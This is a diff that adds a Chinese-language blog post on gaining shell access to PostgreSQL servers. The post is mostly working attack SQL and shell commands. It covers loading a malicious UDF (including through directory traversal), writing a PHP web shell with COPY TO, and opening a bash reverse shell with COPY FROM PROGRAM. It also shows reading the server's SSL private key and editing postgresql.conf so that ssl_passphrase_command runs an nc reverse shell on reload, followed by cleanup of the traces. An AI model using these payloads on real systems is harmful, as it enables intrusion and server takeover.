@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>攻击数据库之Postgresql - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=GETSHELL>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">攻击数据库之Postgresql</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2020-05-25</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/GETSHELL/" rel="tag">GETSHELL</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <h1 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h1><p>8.2以下可以直接调用系统的动态链接库&#x2F;lib&#x2F;libc.so.6或者是&#x2F;lib64&#x2F;libc.so.6(未测试)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) <span class="keyword">RETURNS</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> C STRICT;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) <span class="keyword">RETURNS</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib64/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> C STRICT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>8.2及以上版本可直接利用sqlmap&#x2F;data&#x2F;udf中所提供的udf文件，我这里测试了一下9.5的，好像没法用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postgres=<span class="comment"># CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS &#x27;/tmp/udf.so&#x27;, &#x27;sys_eval&#x27; LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;</span></span><br><span class="line">ERROR:  could not load library <span class="string">&quot;/tmp/udf.so&quot;</span>: /tmp/udf.so: invalid ELF header</span><br></pre></td></tr></table></figure>
+<p>不过好在还可以利用<a href="https://github.com/sqlmapproject/udfhack">udfhack</a>自己生成任意版本的udf</p>
+<p>找到对应版本的postgresql源码(这里我用的12.2)，进行本地安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure -prefix=/usr/local/pgsql --without-readline --without-zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<p>利用udfhack生成udf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/udfhack</span><br><span class="line"><span class="built_in">cd</span> udfhack/linux/lib_postgresqludf_sys</span><br><span class="line">gcc -Wall -I/usr/local/pgsql/include/server/ -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so</span><br><span class="line">strip -sx lib_postgresqludf_sys.so</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/25/Attack-Database-Postgresql/source-install.png"><br>在目标上写入生成的udf文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_from_bytea(<span class="number">9999</span>, <span class="string">&#x27;\x......&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> lo_export(<span class="number">9999</span>,<span class="string">&#x27;/tmp/udf.so&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> sys_eval(text) <span class="keyword">RETURNS</span> text <span class="keyword">AS</span> <span class="string">&#x27;/tmp/udf.so&#x27;</span>, <span class="string">&#x27;sys_eval&#x27;</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="keyword">NULL</span> <span class="keyword">ON</span> <span class="keyword">NULL</span> INPUT IMMUTABLE;</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+<h2 id="利用目录穿越加载udf"><a href="#利用目录穿越加载udf" class="headerlink" title="利用目录穿越加载udf"></a>利用目录穿越加载udf</h2><p>另外<a href="https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html">某国外大佬</a>发现在最新版的postgresql中，superuser不再允许从***&#x2F;PostgreSQL&#x2F;11&#x2F;lib之外的地方加载udf文件，且该目录不允许NETWORK_SERVICE或者postgres写入文件。但是作者发现可以利用一个目录穿越漏洞进行加载udf文件，向下面这样</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 写入文件到***/PostgreSQL/11/data</span></span><br><span class="line"><span class="keyword">select</span> lo_export(<span class="number">9999</span>,<span class="string">&#x27;udf.so&#x27;</span>);</span><br><span class="line"><span class="comment">-- 目录穿越加载udf</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> sys_eval(text) <span class="keyword">RETURNS</span> text <span class="keyword">AS</span> <span class="string">&#x27;../data/udf.so&#x27;</span>, <span class="string">&#x27;sys_eval&#x27;</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="keyword">NULL</span> <span class="keyword">ON</span> <span class="keyword">NULL</span> INPUT IMMUTABLE;</span><br></pre></td></tr></table></figure>
+<h1 id="利用COPY特性getshell"><a href="#利用COPY特性getshell" class="headerlink" title="利用COPY特性getshell"></a>利用COPY特性getshell</h1><p>postgresql 9.3开始引入COPY，可利用其特性进行getshell</p>
+<h2 id="copy-to"><a href="#copy-to" class="headerlink" title="copy to"></a>copy to</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span> (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="copy-from-program"><a href="#copy-from-program" class="headerlink" title="copy from program"></a>copy from program</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tmp(t text);</span><br><span class="line"><span class="keyword">copy</span> tmp <span class="keyword">from</span> program <span class="string">&#x27;bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/25/Attack-Database-Postgresql/copy-from-program.png"></p>
+<h1 id="写配置文件getshell"><a href="#写配置文件getshell" class="headerlink" title="写配置文件getshell"></a>写配置文件getshell</h1><p>所有的操作仅需select进行，非堆叠注入可考虑，linux下专用</p>
+<h2 id="获取配置文件内容"><a href="#获取配置文件内容" class="headerlink" title="获取配置文件内容"></a>获取配置文件内容</h2><p>查询配置文件目录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> setting <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;config_file&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>利用lo_import读取配置文件，指定loid为1234</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_import(<span class="string">&#x27;/etc/postgresql/12/main/postgresql.conf&#x27;</span>, <span class="number">1234</span>);</span><br></pre></td></tr></table></figure>
+<p>查询对应loid，获取并还原配置文件内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> string_agg(data,<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid<span class="operator">=</span><span class="string">&#x27;1234&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/25/Attack-Database-Postgresql/get-conf.png"></p>
+<h2 id="构造带passphrase的ssl-key-file"><a href="#构造带passphrase的ssl-key-file" class="headerlink" title="构造带passphrase的ssl_key_file"></a>构造带passphrase的ssl_key_file</h2><p>查看还原后的配置文件中ssl_key_file的路径为’&#x2F;etc&#x2F;ssl&#x2F;private&#x2F;ssl-cert-snakeoil.key’，读取ssl_key_file的内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;/etc/ssl/private/ssl-cert-snakeoil.key&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/25/Attack-Database-Postgresql/get-ssl-key.png"><br>通过openssl构造一个带passphrase的ssl_key_file，passphrase可任意</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -aes256 -<span class="keyword">in</span> /tmp/ssl-cert-snakeoil.key -out /tmp/ssl-passphrase.key</span><br></pre></td></tr></table></figure>
+<p>利用lo_from_bytea写入构造后的ssl_key_file内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_from_bytea(<span class="number">4321</span>,<span class="string">&#x27;\x2d2d2d2d2d424547...4b45592d2d2d2d2d0a&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 语句过长时可采用lo_put分次写入</span></span><br><span class="line"><span class="keyword">select</span> lo_from_bytea(<span class="number">4321</span>,<span class="string">&#x27;\x2d2d2d2d2d&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> lo_put(<span class="number">4321</span>,<span class="number">5</span>,<span class="string">&#x27;\x424547...&#x27;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">select</span> lo_put(<span class="number">4321</span>,<span class="number">1790</span>,<span class="string">&#x27;\x2d2d2d2d2d0a&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/25/Attack-Database-Postgresql/insert-ssl-key.png"></p>
+<h2 id="修改表中配置文件内容"><a href="#修改表中配置文件内容" class="headerlink" title="修改表中配置文件内容"></a>修改表中配置文件内容</h2><p>查看ssl_key_file所在位置，利用lo_put注释掉该行内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/postgresql.conf | grep -b ssl_key_file</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_put(<span class="number">1234</span>,<span class="number">4063</span>,<span class="string">&#x27;\x23&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>查看配置文件总长，并在最后添加三行配置用于执行命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssl_key_file <span class="operator">=</span> <span class="string">&#x27;/var/lib/postgresql/12/main/PG_VERSION&#x27;</span></span><br><span class="line">ssl_passphrase_command_supports_reload <span class="operator">=</span> <span class="keyword">on</span></span><br><span class="line">ssl_passphrase_command <span class="operator">=</span> <span class="string">&#x27;bash -c &quot;test -p /dev/shm/pipe || mkfifo /dev/shm/pipe; nc 127.0.0.1 9999 &lt; /dev/shm/pipe | /bin/bash &gt; /dev/shm/pipe &amp; echo passphrase; exit 0&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> lo_put(<span class="number">1234</span>,<span class="number">26784</span>,<span class="string">&#x27;\x73736c5f6b65795f66696c65203d20272f7661722f6c69622f706f737467726573716c2f31322f6d61696e2f50475f56455253494f4e270a73736c5f706173737068726173655f636f6d6d616e645f737570706f7274735f72656c6f6164203d206f6e0a73736c5f706173737068726173655f636f6d6d616e64203d202762617368202d63202274657374202d70202f6465762f73686d2f70697065207c7c206d6b6669666f202f6465762f73686d2f706970653b206e63203132372e302e302e312039393939203c202f6465762f73686d2f70697065207c202f62696e2f62617368203e202f6465762f73686d2f706970652026206563686f20706173737068726173653b2065786974203022270a&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/25/Attack-Database-Postgresql/change-conf.png"></p>
+<h2 id="写入文件GETSHELL"><a href="#写入文件GETSHELL" class="headerlink" title="写入文件GETSHELL"></a>写入文件GETSHELL</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_export(<span class="number">1234</span>,<span class="string">&#x27;/etc/postgresql/12/main/postgresql.conf&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> lo_export(<span class="number">4321</span>,<span class="string">&#x27;/var/lib/postgresql/12/main/PG_VERSION&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> pg_reload_conf();</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/25/Attack-Database-Postgresql/getshell.png"></p>
+<h2 id="清理数据"><a href="#清理数据" class="headerlink" title="清理数据"></a>清理数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_unlink(<span class="number">1234</span>);</span><br><span class="line"><span class="keyword">select</span> lo_unlink(<span class="number">4321</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 最好将配置文件啥的还原回去，否则postgresql重启后是无法使用的</span></span><br></pre></td></tr></table></figure>
+<h1 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h1><ul>
+<li>各种操作必须小心，最终的写入之前，一定要检查内容是否正确，不然数据库真的可能会挂</li>
+<li>loid位数不宜设置过高，不然操作pg_largeobject中的文件内容时会出现各种错误</li>
+<li>配置文件最后添加三行代码时，lo_put指定的位置应该为配置文件长度-1，不然lo_put会以一个00字节填充，造成写入后无法识别配置的问题</li>
+</ul>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.postgresql.org/ftp">https://www.postgresql.org/ftp</a><br><a href="https://github.com/sqlmapproject/udfhack">https://github.com/sqlmapproject/udfhack</a><br><a href="https://pulsesecurity.co.nz/articles/postgres-sqli">https://pulsesecurity.co.nz/articles/postgres-sqli</a><br><a href="https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html">https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html</a></p>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
